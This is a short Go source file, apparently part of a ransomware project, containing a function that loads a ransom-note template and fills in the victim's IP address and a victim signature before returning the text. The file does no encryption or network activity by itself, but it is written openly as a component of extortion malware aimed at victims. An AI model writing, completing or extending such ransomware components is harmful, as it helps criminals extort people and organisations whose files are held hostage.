package utilities

import (
	"log"
	"os"
	"path/filepath"
	"strings"
)

// CreateRansomNote creates a ransom note for the victim
func CreateRansomNote(victimIP string, victimSignature string) string {

	ransomnoteFilePath, err := filepath.Abs("ransomnote/ransomnote.txt")
	if err != nil {
		log.Panicf("Error getting absolute path for ransomnote file: %v", err.Error())
	}

	// Open ransomnote file
	ransomnote, err := os.ReadFile(ransomnoteFilePath)
	if err != nil {
		log.Panicf("Error reading ransomnote file: %v", err.Error())
	}

	ransomnoteContent := string(ransomnote)
	ransomnoteContent = strings.ReplaceAll(ransomnoteContent, "${VICTIM_IP}", victimIP)
	ransomnoteContent = strings.ReplaceAll(ransomnoteContent, "${VICTIM_SIGNATURE}", victimSignature)
	// Add null terminator to the end of the ransom note
	ransomnoteContent += "\x00"

	return ransomnoteContent
}
